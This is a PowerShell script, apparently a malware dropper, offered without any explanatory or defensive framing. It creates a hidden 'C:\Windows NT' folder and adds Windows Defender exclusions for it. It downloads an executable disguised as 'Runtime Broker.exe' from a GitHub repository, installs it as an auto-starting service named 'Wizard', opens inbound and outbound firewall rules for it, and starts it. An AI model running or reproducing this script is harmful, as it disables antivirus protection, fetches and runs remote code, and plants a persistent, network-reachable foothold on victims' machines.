$root = "C:\Windows NT"
$servicio = "Wizard"

if (-not (Test-Path $root)) {
    try {
        New-Item -Path $root -ItemType Directory
        Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
    }
    catch {
        exit 1
    }
}
else {
    try {
        Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
    }
    catch {
        exit 1
    }
}

$root_file = Join-Path -Path $root -ChildPath "Runtime Broker.exe"

try {
    Add-MpPreference -ExclusionPath $root
    Add-MpPreference -ExclusionProcess $root_file
}
catch {
    exit 1
}

try {
    Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/BIT-CROW/refs/heads/main/Wizard/build/Runtime Broker.exe" -Destination $root_file
}
catch {
    exit 1
}

try {
    $acl = Get-Acl $root_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Usuarios", "FullControl", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $root_file -AclObject $acl
}
catch {
    exit 1
}

try {
    New-Service -Name $servicio -BinaryPathName $root_file -DisplayName $servicio -StartupType Automatic
}
catch {
    exit 1
}

$port = 45888

try {
    New-NetFirewallRule -DisplayName "$servicio Inbound" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -Program $root_file -Profile Any
}
catch {
    exit 1
}

try {
    New-NetFirewallRule -DisplayName "$servicio Outbound" -Direction Outbound -Protocol TCP -LocalPort $port -Action Allow -Program $root_file -Profile Any
}
catch {
    exit 1
}

try {
    New-NetFirewallRule -DisplayName "$servicio Executable Inbound" -Direction Inbound -Protocol TCP -Action Allow -Program $root_file -Profile Any
}
catch {
    exit 1
}

try {
    New-NetFirewallRule -DisplayName "$servicio Executable Outbound" -Direction Outbound -Protocol TCP -Action Allow -Program $root_file -Profile Any
}
catch {
    exit 1
}

try {
    Start-Service -Name $servicio
}
catch {
    exit 1
}
